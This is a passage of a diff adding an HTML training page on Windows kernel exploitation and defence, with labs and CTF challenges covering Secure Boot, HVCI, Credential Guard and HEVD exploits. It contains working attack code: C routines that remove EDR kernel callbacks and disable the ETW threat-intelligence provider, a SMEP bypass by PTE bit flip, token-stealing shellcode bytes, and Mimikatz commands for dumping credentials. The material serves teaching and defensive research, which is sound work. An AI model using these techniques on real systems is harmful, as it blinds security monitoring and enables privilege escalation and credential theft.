+# Each variable contains EFI_SIGNATURE_LIST structures
+# Use signtool or sbsiglist for parsing
+
+# Check for the Microsoft UEFI CA (signs third-party bootloaders)
+$certs = (Get-SecureBootUEFI -Name db).Bytes
+# Parse manually or use:
+# Install-Module -Name UEFIv2
+# Get-UEFISecureBootCerts -Variable db
+
+# Check dbx entries (revoked hashes/certs)
+# Large dbx = more revoked vulnerable bootloaders (good!)
+"dbx size: $($dbx.Bytes.Length) bytes"
+# Each SHA256 hash entry is 48 bytes (16 GUID + 32 hash)
+"Approximate revoked hashes: $([math]::Floor($dbx.Bytes.Length / 48))"
+
+# Check boot configuration
+bcdedit /enum firmware
+bcdedit /enum {bootmgr}
+
+# Verify boot components' signatures
+Get-AuthenticodeSignature "C:\Windows\Boot\EFI\bootmgfw.efi"
+Get-AuthenticodeSignature "C:\Windows\System32\winload.efi"
+Get-AuthenticodeSignature "C:\Windows\System32\ntoskrnl.exe"</code></pre>
+          <p><strong>Tasks:</strong></p>
+          <ol>
+            <li>Extract and catalog all certificates in the db database</li>
+            <li>Identify the Microsoft UEFI CA vs Microsoft Windows Production CA</li>
+            <li>Count revoked entries in dbx and research what they correspond to</li>
+            <li>Research: If you could add your own certificate to db, what could you boot?</li>
+          </ol>
+        </div>
+      </div>
+
+      <!-- LAB 9 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 9: Kernel Callback Enumeration and Removal</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Enumerate and understand kernel notification callbacks (EDR blind spots).</p>
+          <p><strong>Environment:</strong> Windows 10/11 VM with WinDbg kernel debugger</p>
+<pre><code class="language-bash"># In WinDbg kernel debugger:
+
+# Process creation callbacks (PsSetCreateProcessNotifyRoutine)
+dx @$cursession.Processes.Where(p => p.Name == "System").First().Threads.First()
+# Find callback array:
+x nt!PspCreateProcessNotifyRoutine
+# Dump the callback array (up to 64 entries)
+dps nt!PspCreateProcessNotifyRoutine L40
+
+# Each entry is an EX_CALLBACK_ROUTINE_BLOCK pointer (low bits masked):
+# dt nt!_EX_CALLBACK_ROUTINE_BLOCK [addr & ~0xF]
+
+# Thread creation callbacks
+dps nt!PspCreateThreadNotifyRoutine L40
+
+# Image load callbacks (PsSetLoadImageNotifyRoutine)
+dps nt!PspLoadImageNotifyRoutine L40
+
+# Registry callbacks (CmRegisterCallback)
+# Stored in nt!CallbackListHead linked list
+!reg callbacks
+
+# Object callbacks (ObRegisterCallbacks) — used by EDR for handle filtering
+dt nt!_OB_CALLBACK_REGISTRATION
+!object \ObjectTypes\Process
+# Callback entries in OB_OPERATION_REGISTRATION
+
+# Minifilter callbacks (filesystem monitoring)
+!fltkd.filters
+!fltkd.instances</code></pre>
+          <h6>Removal Technique (educational):</h6>
+<pre><code class="language-c">// Remove a process notification callback using kernel R/W
+void RemoveProcessCallback(DWORD64 callbackArrayAddr, int index) {
+    // Read the callback entry
+    DWORD64 entry = KernelRead64(callbackArrayAddr + (index * 8));
+    
+    // Mask low bits to get EX_CALLBACK_ROUTINE_BLOCK pointer
+    DWORD64 blockAddr = entry & ~0xFULL;
+    
+    // Zero the entry in the array
+    KernelWrite64(callbackArrayAddr + (index * 8), 0);
+    
+    printf("[+] Removed callback at index %d (was 0x%llX)\n", index, entry);
+    // Note: In practice, also need to handle reference counting
+    // and the PspNotifyEnableMask
+}</code></pre>
+          <p><strong>Expected Outcome:</strong> Understand how EDR products hook the kernel and how attackers blind them.</p>
+        </div>
+      </div>
+
+      <!-- LAB 10 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 10: VBS and HVCI — Verifying Hypervisor Enforcement</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Prove that HVCI prevents kernel code execution even with arbitrary write.</p>
+          <p><strong>Environment:</strong> Windows 11 VM with VBS + HVCI enabled, vulnerable driver loaded</p>
+          <h6>Steps:</h6>
+<pre><code class="language-powershell"># First verify HVCI is running
+$dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+if ($dg.SecurityServicesRunning -contains 2) {
+    Write-Host "[+] HVCI is ACTIVE" -ForegroundColor Green
+} else {
+    Write-Host "[-] HVCI not running - enable it for this lab" -ForegroundColor Red
+    return
+}</code></pre>
+<pre><code class="language-c">// Test 1: Try to allocate executable kernel pool
+// With HVCI active, ExAllocatePool2 with POOL_FLAG_NON_PAGED_EXECUTE 
+// either fails or the memory is NOT actually executable
+
+// Test 2: Try to make a kernel page executable via PTE manipulation
+void TestHVCIEnforcement(DWORD64 targetKernelPage) {
+    // Find PTE for target page
+    // On x64: PTE_BASE = 0xFFFFF68000000000 (randomized with KASLR on newer builds)
+    // PTE address = PTE_BASE + (VA >> 12) * 8
+    
+    DWORD64 pte_addr = GetPTEAddress(targetKernelPage);
+    DWORD64 pte_value = KernelRead64(pte_addr);
+    
+    printf("[*] Original PTE: 0x%llX\n", pte_value);
+    printf("    NX bit (63): %d\n", (pte_value >> 63) & 1);
+    
+    // Try to clear NX bit (make page executable)
+    DWORD64 new_pte = pte_value & ~(1ULL << 63); // Clear NX
+    KernelWrite64(pte_addr, new_pte);
+    
+    // Read back...
+    DWORD64 readback = KernelRead64(pte_addr);
+    printf("[*] PTE after write: 0x%llX\n", readback);
+    
+    // With HVCI: The write may succeed to the PTE, but the hypervisor's
+    // SLAT/EPT still enforces NX. Attempting execution will fault.
+    // The Secure Kernel will detect the PTE inconsistency and bugcheck.
+    
+    printf("[!] With HVCI: Hypervisor EPT overrides PTE permissions\n");
+    printf("[!] Code execution on this page will STILL fault despite PTE change\n");
+}
+
+// Test 3: Write shellcode to kernel pool and try to execute
+// Result with HVCI: STATUS_ACCESS_VIOLATION / bugcheck</code></pre>
+          <p><strong>Expected Outcome:</strong> Demonstrate that HVCI creates a fundamental barrier — even with full kernel R/W at VTL 0, code execution is blocked by the hypervisor. Attackers must resort to data-only/code-reuse attacks.</p>
+        </div>
+      </div>
+
+      <!-- LAB 11 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 11: Windows Vulnerable Driver Blocklist Analysis</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Analyze the Microsoft recommended driver blocklist and test enforcement.</p>
+          <p><strong>Environment:</strong> Windows 11 VM with HVCI or WDAC, Internet access</p>
+<pre><code class="language-powershell"># Check if vulnerable driver blocklist is active
+$ciPolicy = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+Write-Host "Code Integrity Policy Status: $($ciPolicy.CodeIntegrityPolicyEnforcementStatus)"
+# 0=Off, 1=Audit, 2=Enforced
+
+# The blocklist is stored as a WDAC/CI policy
+# Location: C:\Windows\System32\CodeIntegrity\driversipolicy.p7b
+Get-Item "C:\Windows\System32\CodeIntegrity\driversipolicy.p7b" -ErrorAction SilentlyContinue
+Get-Item "C:\Windows\System32\CodeIntegrity\SiPolicy.p7b" -ErrorAction SilentlyContinue
+
+# List recent driver block events
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-CodeIntegrity/Operational'; Id=3089} -MaxEvents 20 -ErrorAction SilentlyContinue |
+  Select-Object TimeCreated, Message
+
+# Test: Try to load a known blocked driver (RTCore64.sys)
+sc.exe create TestVulnDrv type= kernel binPath= "C:\test\RTCore64.sys"
+sc.exe start TestVulnDrv
+# Expected: ERROR_INVALID_IMAGE_HASH (if HVCI+blocklist active)
+# Event log should show block event
+
+# Compute hash of a driver to check against blocklist
+Get-FileHash "C:\test\RTCore64.sys" -Algorithm SHA256
+
+# Download and parse the official blocklist XML
+# https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules
+# The XML contains &lt;Deny&gt; rules with SHA256 flat file hashes and SHA1 page hashes</code></pre>
+          <p><strong>Tasks:</strong></p>
+          <ol>
+            <li>Verify blocklist enforcement by attempting to load a known vulnerable driver</li>
+            <li>Check Event Viewer for Code Integrity events (ID 3089)</li>
+            <li>Download the blocklist XML and count how many unique drivers are blocked</li>
+            <li>Identify gaps: find signed vulnerable drivers NOT yet on the blocklist (check LOLDrivers project)</li>
+            <li>Research: How does an attacker bypass the blocklist? (Answer: find unblocked vulnerable driver, or disable CI policy)</li>
+          </ol>
+        </div>
+      </div>
+
+      <!-- LAB 12 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 12: Credential Guard Attack and Defense Validation</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Validate that Credential Guard actually protects credentials against Mimikatz.</p>
+          <p><strong>Environment:</strong> Windows 11 Enterprise VM, domain-joined (or local with CG enabled), Mimikatz</p>
+          <h6>Phase 1: Without Credential Guard</h6>
+<pre><code class="language-powershell"># Disable Credential Guard (if enabled)
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -Value 0
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 0
+# Reboot
+
+# Log in with domain credentials, then run Mimikatz as SYSTEM:
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+# Observe: NTLM hashes and possibly plaintext passwords visible</code></pre>
+          <h6>Phase 2: With Credential Guard</h6>
+<pre><code class="language-powershell"># Enable VBS + Credential Guard
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 1
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequirePlatformSecurityFeatures" -Value 3
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -Value 1
+# Reboot
+
+# Verify CG is running
+Get-Process LsaIso -ErrorAction SilentlyContinue
+(Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard).SecurityServicesRunning
+
+# Log in with same domain credentials, then Mimikatz:
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+# Observe: Domain credentials show "LSA Isolated" / encrypted blobs
+# NTLM hash field shows * or encrypted value
+# Local SAM hashes may still be visible (not protected by CG)</code></pre>
+          <h6>Phase 3: Verify LsaIso Protection</h6>
+<pre><code class="language-powershell"># Try to dump LsaIso.exe
+procdump.exe -ma (Get-Process LsaIso).Id lsaiso.dmp
+# Result: Access denied (PPL-protected + VTL 1)
+
+# Try to read LsaIso memory via kernel debugger:
+# In WinDbg: .process /p [LsaIso EPROCESS]; !address
+# Result: Memory pages not accessible from VTL 0 debugger</code></pre>
+          <p><strong>Expected Outcome:</strong> Clear before/after comparison showing Credential Guard's effectiveness against credential theft.</p>
+        </div>
+      </div>
+
+      <!-- LAB 13 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 13: ETW Threat Intelligence Provider Manipulation</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Understand and disable ETW-TI (the kernel telemetry channel used by EDR).</p>
+          <p><strong>Environment:</strong> Windows 10/11 VM with kernel R/W primitive</p>
+<pre><code class="language-c">// ETW Threat Intelligence (ETW-TI) provider GUID:
+// {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
+// This is a special kernel-mode ETW provider that emits events for:
+// - Process hollowing, injection, thread manipulation
+// - Syscall patterns, handle operations on protected processes
+// - Memory allocation patterns (RWX)
+
+// The provider registration is stored at: nt!EtwThreatIntProvRegHandle
+// Patching this handle to 0 disables all ETW-TI events
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+// Using kernel R/W from vulnerable driver
+extern DWORD64 KernelRead64(DWORD64 addr);
+extern void KernelWrite64(DWORD64 addr, DWORD64 val);
+extern DWORD64 GetKernelSymbolAddress(const char* symbol);
+
+void DisableETWTI() {
+    // Locate EtwThreatIntProvRegHandle
+    // Method 1: Pattern scan in ntoskrnl for known reference patterns
+    // Method 2: Calculate from known offset to nearby exported symbol
+    DWORD64 etwTiHandle = GetKernelSymbolAddress("EtwThreatIntProvRegHandle");
+    
+    if (!etwTiHandle) {
+        printf("[-] Could not locate EtwThreatIntProvRegHandle\n");
+        return;
+    }
+    
+    printf("[+] EtwThreatIntProvRegHandle at: 0x%llX\n", etwTiHandle);
+    
+    // The handle points to an ETW_REG_ENTRY structure
+    DWORD64 regEntry = KernelRead64(etwTiHandle);
+    printf("[+] ETW_REG_ENTRY: 0x%llX\n", regEntry);
+    
+    // Zero the GuidEntry pointer (offset 0x20 in ETW_REG_ENTRY)
+    // This disconnects the provider from receiving enable/disable notifications
+    DWORD64 guidEntry = KernelRead64(regEntry + 0x20);
+    printf("[+] GuidEntry: 0x%llX\n", guidEntry);
+    
+    // Disable by zeroing the provider enable callback or ProviderEnableInfo
+    KernelWrite64(regEntry + 0x20, 0); // Null GuidEntry
+    
+    printf("[+] ETW-TI provider disabled. EDR is now blind to kernel telemetry.\n");
+}
+
+int main() {
+    // ... load driver, get R/W primitive ...
+    DisableETWTI();
+    
+    // Verify: perform suspicious activity that should generate ETW-TI events
+    // Check that no events appear in EDR/Defender
+    return 0;
+}</code></pre>
+          <p><strong>Detection:</strong> Monitor for modification of ETW provider structures. Some EDRs periodically verify their provider handles are intact.</p>
+        </div>
+      </div>
+
+      <!-- LAB 14 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 14: SMEP Bypass via PTE Bit Flip</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Bypass SMEP by changing the U/S (User/Supervisor) bit in the page table entry for user-mode shellcode.</p>
+          <p><strong>Environment:</strong> Windows 10 VM (HVCI DISABLED), kernel write primitive, WinDbg</p>
+<pre><code class="language-c">// SMEP prevents kernel from executing user-mode pages
+// Bypass: Flip the U/S bit in the PTE so the page appears as kernel-mode (Supervisor)
+// The CPU then allows execution from that page while in ring 0
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+// PTE self-referencing entry base (Windows 10, pre-randomization)
+// Modern builds randomize this, need to leak from MiGetPteAddress
+#define PTE_BASE 0xFFFFF68000000000ULL
+#define PDE_BASE 0xFFFFF6FB40000000ULL
+
+DWORD64 GetPTEAddress(DWORD64 virtualAddress) {
+    // PTE_VA = PTE_BASE + (VA >> 12) * 8
+    return PTE_BASE + ((virtualAddress >> 12) << 3);
+}
+
+// User-mode shellcode (token stealing, etc.)
+BYTE shellcode[] = {
+    // ... your shellcode here ...
+    0xC3 // ret (placeholder)
+};
+
+int main() {
+    // Allocate shellcode at a known user-mode address
+    LPVOID scAddr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(scAddr, shellcode, sizeof(shellcode));
+    printf("[+] Shellcode at user VA: 0x%p\n", scAddr);
+    
+    // Calculate PTE address for shellcode page
+    DWORD64 pteAddr = GetPTEAddress((DWORD64)scAddr);
+    printf("[+] PTE address: 0x%llX\n", pteAddr);
+    
+    // Read current PTE
+    DWORD64 pte = KernelRead64(pteAddr);
+    printf("[+] Current PTE: 0x%llX\n", pte);
+    printf("    U/S bit (2): %d (1=User, 0=Supervisor)\n", (pte >> 2) & 1);
+    
+    // Clear U/S bit (bit 2) → page becomes Supervisor
+    DWORD64 newPte = pte & ~(1ULL << 2);
+    KernelWrite64(pteAddr, newPte);
+    printf("[+] Modified PTE: 0x%llX (U/S=0, now Supervisor page)\n", newPte);
+    
+    // Now when kernel executes code at scAddr, SMEP won't trigger
+    // because the page is marked as Supervisor
+    
+    // Trigger kernel to jump to our shellcode address
+    // (via whatever vulnerability/exploit path you have)
+    printf("[+] SMEP bypassed. Kernel can now execute shellcode at 0x%p\n", scAddr);
+    
+    // IMPORTANT: Flush TLB after PTE modification
+    // In practice, call invlpg or trigger context switch
+    
+    return 0;
+}</code></pre>
+          <p><strong>Note:</strong> This does NOT work with HVCI enabled — the hypervisor will detect unauthorized PTE modification and enforce the original permission through EPT.</p>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- CTF TAB -->
+    <!-- ============================================================ -->
+    <div class="tab-pane fade" id="ctf" role="tabpanel" aria-labelledby="ctf-tab">
+
+      <h2>CTF Challenges</h2>
+
+      <!-- CTF 1 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Challenge 1: HEVD Stack Overflow — Token Steal</h5></div>
+        <div class="card-body">
+          <p><strong>Platform:</strong> <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HackSys Extreme Vulnerable Driver (HEVD)</a></p>
+          <p><strong>Difficulty:</strong> Easy</p>
+          <p><strong>Objective:</strong> Exploit the HEVD stack buffer overflow to execute token-stealing shellcode and elevate to SYSTEM.</p>
+          <p><strong>Skills:</strong> Kernel stack overflow, shellcode writing, SMEP bypass (if enabled), token stealing</p>
+          <h6>Approach:</h6>
+          <ol>
+            <li>Identify the vulnerable IOCTL (0x222003) and buffer overflow in <code>TriggerStackOverflow</code></li>
+            <li>Calculate offset to return address (controlled via buffer size)</li>
+            <li>Write token-stealing shellcode: walk EPROCESS list, find SYSTEM, copy token</li>
+            <li>ROP chain to disable SMEP if needed (CR4 bit flip gadget)</li>
+            <li>Return cleanly to user-mode (stack repair)</li>
+          </ol>
+<pre><code class="language-c">// Token stealing shellcode (x64 Windows 10)
+// Offsets: KTHREAD.ApcState.Process=0x220, EPROCESS.ActiveProcessLinks=0x448
+//          EPROCESS.UniqueProcessId=0x440, EPROCESS.Token=0x4B8
+BYTE TokenStealShellcode[] = {
+    0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, // mov rax, gs:[0x188] ; KTHREAD
+    0x48, 0x8B, 0x80, 0x20, 0x02, 0x00, 0x00,             // mov rax, [rax+0x220] ; EPROCESS
+    0x48, 0x89, 0xC3,                                       // mov rbx, rax ; save current EPROCESS
+    0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00,             // mov rax, [rax+0x448] ; ActiveProcessLinks.Flink
+    0x48, 0x2D, 0x48, 0x04, 0x00, 0x00,                   // sub rax, 0x448 ; back to EPROCESS start
+    0x48, 0x83, 0xB8, 0x40, 0x04, 0x00, 0x00, 0x04,       // cmp [rax+0x440], 4 ; PID == 4 (System)?
+    0x75, 0xE7,                                             // jne loop
+    0x48, 0x8B, 0x88, 0xB8, 0x04, 0x00, 0x00,             // mov rcx, [rax+0x4B8] ; System Token
+    0x48, 0x89, 0x8B, 0xB8, 0x04, 0x00, 0x00,             // mov [rbx+0x4B8], rcx ; overwrite current Token
+    0x48, 0x31, 0xC0,                                       // xor rax, rax ; NTSTATUS = SUCCESS
+    0xC3                                                     // ret
+};</code></pre>
+          <p><strong>Flag:</strong> Run <code>whoami</code> after exploitation — output must be <code>nt authority\system</code></p>
+        </div>
+      </div>
+
+      <!-- CTF 2 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Challenge 2: HEVD Arbitrary Write — Win via What-Where</h5></div>
+        <div class="card-body">
+          <p><strong>Platform:</strong> HEVD</p>
+          <p><strong>Difficulty:</strong> Medium</p>
+          <p><strong>Objective:</strong> Use the arbitrary write vulnerability (Write-What-Where) to achieve privilege escalation without executing shellcode.</p>
+          <p><strong>Skills:</strong> Data-only attacks, kernel object manipulation, understanding Windows token structures</p>
+          <h6>Approach:</h6>
+          <ol>
+            <li>Use IOCTL 0x22200B (ArbitraryWrite) — gives one arbitrary kernel write</li>
+            <li>Leak EPROCESS address of current process (via NtQuerySystemInformation)</li>
+            <li>Overwrite <code>EPROCESS.Token</code> with SYSTEM process token value</li>
+            <li>Alternative: Overwrite <code>SEP_TOKEN_PRIVILEGES.Enabled</code> to grant SeDebugPrivilege</li>
+          </ol>
+          <p><strong>Constraint:</strong> No shellcode execution allowed. Pure data-only corruption.</p>
+          <p><strong>Flag:</strong> Open a SYSTEM shell OR demonstrate SeDebugPrivilege to dump lsass</p>
+        </div>
+      </div>
+
+      <!-- CTF 3 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Challenge 3: HEVD Pool Overflow — NonPagedPoolNx Exploitation</h5></div>
+        <div class="card-body">
+          <p><strong>Platform:</strong> HEVD</p>
+          <p><strong>Difficulty:</strong> Hard</p>
+          <p><strong>Objective:</strong> Exploit a kernel pool overflow on NonPagedPoolNx to achieve code execution despite NX enforcement.</p>
+          <p><strong>Skills:</strong> Pool spray, pool feng shui, object type confusion, function pointer corruption</p>
+          <h6>Approach:</h6>
+          <ol>
+            <li>Spray pool with objects that have exploitable function pointers (e.g., EVENT objects with callback structures)</li>
+            <li>Trigger HEVD pool overflow (IOCTL 0x22200F) to corrupt adjacent object</li>
+            <li>Corrupted object's function pointer → points to ROP chain or existing kernel gadgets</li>
+            <li>Since pool is NX, you CANNOT place shellcode in pool. Must use code reuse (ROP/JOP)</li>
+            <li>Chain gadgets to: disable SMEP → jump to user shellcode, OR do data-only token swap</li>
+          </ol>
+          <p><strong>Flag:</strong> SYSTEM shell with explanation of pool layout used</p>
+        </div>
+      </div>
+
+      <!-- CTF 4 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Challenge 4: VBS Red Team — Data-Only Attack Under HVCI</h5></div>
+        <div class="card-body">
+          <p><strong>Platform:</strong> Custom challenge (Windows 11 + HVCI)</p>
+          <p><strong>Difficulty:</strong> Expert</p>
+          <p><strong>Objective:</strong> Achieve privilege escalation on a system with VBS + HVCI + kCFG enabled. No unsigned code execution possible.</p>
+          <p><strong>Skills:</strong> Data-only attacks, understanding kCFG bitmap, code reuse within signed code</p>
+          <h6>Constraints:</h6>
+          <ul>
+            <li>HVCI enforced: no executable pool, no PTE manipulation for RWX</li>
+            <li>kCFG: indirect calls validated against bitmap</li>
+            <li>CET Shadow Stack: ROP chains will fault on return</li>
+          </ul>
+          <h6>Approach (data-only):</h6>
+          <ol>
+            <li>Use a vulnerable IOCTL for arbitrary kernel R/W (signed vulnerable driver)</li>
+            <li>Directly overwrite EPROCESS.Token (no code execution needed)</li>
+            <li>Or: corrupt SECURITY_DESCRIPTOR of target process to allow full access</li>
+            <li>Or: modify Job object security boundaries</li>
+          </ol>
+          <p><strong>Flag:</strong> Document your data-only exploit chain. Show that no instruction was executed from attacker-controlled memory.</p>
+        </div>
+      </div>
+
+      <!-- CTF 5 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Challenge 5: BYOVD Chain — From Admin to Kernel to EDR Bypass</h5></div>
+        <div class="card-body">
+          <p><strong>Platform:</strong> Custom (Windows 10/11 with Defender + Sysmon)</p>
+          <p><strong>Difficulty:</strong> Medium-Hard</p>
+          <p><strong>Objective:</strong> Load a vulnerable signed driver, disable EDR protections, dump credentials — all while evading detection.</p>
+          <p><strong>Skills:</strong> BYOVD loading, callback removal, ETW patching, evasion</p>
+          <h6>Challenge Rules:</h6>
+          <ul>
+            <li>Start with local admin on a machine running Windows Defender + Sysmon</li>
+            <li>Must load a BYOVD driver without triggering Defender alert</li>
+            <li>Must disable: process callbacks, ETW-TI, minifilter callbacks</li>
+            <li>Must dump lsass credentials after disabling protections</li>
+            <li>Document each step's detection vectors and your evasion technique</li>
+          </ul>
+          <p><strong>Flag:</strong> Extracted NTLM hashes + Sysmon/Defender event log showing no alerts triggered</p>
+        </div>
+      </div>
+
+      <!-- CTF 6 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Challenge 6: Secure Boot Bypass Research Challenge</h5></div>
+        <div class="card-body">
+          <p><strong>Platform:</strong> Research/Analysis (no exploitation required)</p>
+          <p><strong>Difficulty:</strong> Medium</p>
+          <p><strong>Objective:</strong> Analyze the BlackLotus bootkit (CVE-2023-24932) attack chain and develop detection signatures.</p>
+          <h6>Tasks:</h6>
+          <ol>
+            <li>Research CVE-2022-21894 (Baton Drop) — the Secure Boot bypass used by BlackLotus</li>
+            <li>Explain: Why couldn't Microsoft simply revoke the vulnerable bootloader immediately?</li>
+            <li>Map the full boot chain attack: which signed binary is abused, how the bypass works, how persistence is achieved</li>
+            <li>Write YARA rules or detection logic for:
+              <ul>
+                <li>Modified EFI System Partition files</li>
+                <li>Unexpected boot configuration changes</li>
+                <li>BlackLotus-specific artifacts in memory</li>
+              </ul>
+            </li>
+            <li>Propose a detection strategy using Measured Boot + TPM attestation</li>
+          </ol>
+          <p><strong>Flag:</strong> Written report with attack chain diagram + at least 3 working detection rules</p>
+        </div>
+      </div>
+
+      <!-- CTF 7 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Challenge 7: PatchGuard Timer Recovery</h5></div>
+        <div class="card-body">
+          <p><strong>Platform:</strong> Windows 10 VM + WinDbg kernel debugging</p>
+          <p><strong>Difficulty:</strong> Hard</p>
+          <p><strong>Objective:</strong> Locate PatchGuard's verification timer(s) in kernel memory using only WinDbg.</p>
+          <h6>Tasks:</h6>
+          <ol>
+            <li>Break into kernel debugger and enumerate all DPC timers (<code>!timer</code>)</li>
+            <li>Identify which timers have DeferredRoutine pointers inside ntoskrnl.exe obfuscated regions</li>
+            <li>For each candidate PG timer:
+              <ul>
+                <li>Determine the DPC routine address</li>
+                <li>Attempt to disassemble the routine (obfuscated)</li>
+                <li>Identify the encrypted context pointer</li>
+              </ul>
+            </li>
+            <li>Cancel one timer and monitor: does PatchGuard still fire from an alternate path?</li>
+            <li>Document how many redundant PatchGuard instances you find on your Windows build</li>
+          </ol>
+<pre><code class="language-bash"># Useful WinDbg commands:
+!timer                           # List all timers
+dt nt!_KTIMER [addr]            # Inspect timer structure
+dt nt!_KDPC [dpc_addr]          # DPC associated with timer
+u [DeferredRoutine] L20         # Disassemble DPC callback
+!pool [context_addr]            # Check pool allocation for context
+s -b nt L?nt_size <pattern>     # Scan ntoskrnl for patterns</code></pre>
+          <p><strong>Flag:</strong> List of all PatchGuard timer addresses found, with screenshots of DPC routines</p>
+        </div>
+      </div>
+
+      <!-- CTF 8 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Challenge 8: Kernel Pool Feng Shui — Type Confusion</h5></div>
+        <div class="card-body">
+          <p><strong>Platform:</strong> Custom vulnerable driver (provided) or HEVD</p>
+          <p><strong>Difficulty:</strong> Hard</p>
+          <p><strong>Objective:</strong> Exploit a use-after-free in the kernel by spraying a different object type into the freed slot.</p>
+          <h6>Scenario:</h6>
+          <ul>
+            <li>Vulnerable driver allocates 0x100 byte object A (has function pointer at offset 0x20)</li>
+            <li>Bug: driver frees object A but retains dangling pointer</li>
+            <li>Challenge: Spray object B of same size into freed slot (type confusion)</li>
+            <li>Object B's data at offset 0x20 becomes the function pointer when driver calls through dangling ptr</li>
+          </ul>
+          <h6>Steps:</h6>
+          <ol>
+            <li>Identify pool chunk size class for 0x100 bytes</li>
+            <li>Find a user-controllable kernel object of matching size (Named Pipes, Completion Ports, etc.)</li>
+            <li>Spray to fill freed slot with controlled data</li>
+            <li>Trigger use-after-free → function pointer call to your ROP chain</li>
+            <li>Achieve privilege escalation</li>
+          </ol>
+          <p><strong>Flag:</strong> SYSTEM shell + writeup explaining spray object choice and reliability</p>
+        </div>
+      </div>
+
+      <!-- CTF 9 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Challenge 9: kCFG Bypass — Calling Valid Kernel Functions Maliciously</h5></div>
+        <div class="card-body">
+          <p><strong>Platform:</strong> Windows 11 with kCFG enabled</p>
+          <p><strong>Difficulty:</strong> Expert</p>
+          <p><strong>Objective:</strong> Bypass kCFG (kernel Control Flow Guard) by chaining calls to legitimate valid target functions that together achieve an attacker goal.</p>
+          <h6>Background:</h6>
+          <p>kCFG validates that indirect call targets are in the CFG bitmap (valid function starts). Your corrupted function pointer MUST point to a valid function — but you get to choose WHICH valid function to call with attacker-controlled arguments.</p>
+          <h6>Approach:</h6>
+          <ol>
+            <li>Dump the kCFG bitmap to see which functions are valid indirect call targets</li>
+            <li>Find a kernel function that:
+              <ul>
+                <li>Is a valid kCFG target</li>
+                <li>Takes attacker-controllable arguments</li>
+                <li>Has a useful side effect (writes to arbitrary address, modifies security structures, etc.)</li>
+              </ul>
+            </li>
+            <li>Examples of useful valid targets:
+              <ul>
+                <li><code>ExAllocatePool2</code> — allocate memory (useful for heap spray)</li>
+                <li><code>memcpy</code> / <code>memmove</code> — arbitrary write if you control src, dst, len</li>
+                <li><code>SePrivilegeCheck</code> — if you control parameters, bypass privilege checks</li>
+              </ul>
+            </li>
+            <li>Chain multiple "calls to valid functions" to achieve privilege escalation</li>
+          </ol>
+          <p><strong>Flag:</strong> Working exploit under kCFG + documentation of which valid functions were abused and why</p>
+        </div>
+      </div>
+
+      <!-- CTF 10 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Challenge 10: KASLR Full Bypass on Modern Windows</h5></div>
+        <div class="card-body">
+          <p><strong>Platform:</strong> Windows 11 23H2 (latest)</p>
+          <p><strong>Difficulty:</strong> Hard</p>
+          <p><strong>Objective:</strong> Defeat KASLR from a Medium integrity process on the latest Windows build (where NtQuerySystemInformation leaks are restricted).</p>
+          <h6>Research Vectors:</h6>
+          <ol>
+            <li><strong>Timing side-channels:</strong> Measure access times to probe kernel page table entries (TSX, prefetch timing, etc.)</li>
+            <li><strong>Shared memory/cache side-channels:</strong> Exploit shared resources between kernel and user</li>
+            <li><strong>Information leaks in other syscalls:</strong> Find an undiscovered info leak in an unrestricted syscall</li>
+            <li><strong>Exceptions/return values:</strong> Different kernel behavior depending on address validity</li>
+            <li><strong>Hardware features:</strong> Intel PT, LBR, performance counters that leak kernel addresses</li>
